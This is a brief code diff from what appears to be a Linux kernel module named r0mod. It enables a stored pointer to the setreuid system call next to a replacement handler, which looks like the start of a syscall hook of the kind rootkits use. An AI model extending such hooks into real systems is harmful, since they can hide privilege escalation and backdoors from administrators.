@@ -6,7 +6,7 @@
 #include <r0mod/global.h>
 
 // Commander
-//asmlinkage long (*sys_setreuid)(uid_t ruid, uid_t euid);
+asmlinkage long (*sys_setreuid)(uid_t ruid, uid_t euid);
 asmlinkage long n_sys_setreuid(uid_t ruid, uid_t euid)
 {
     int ret;
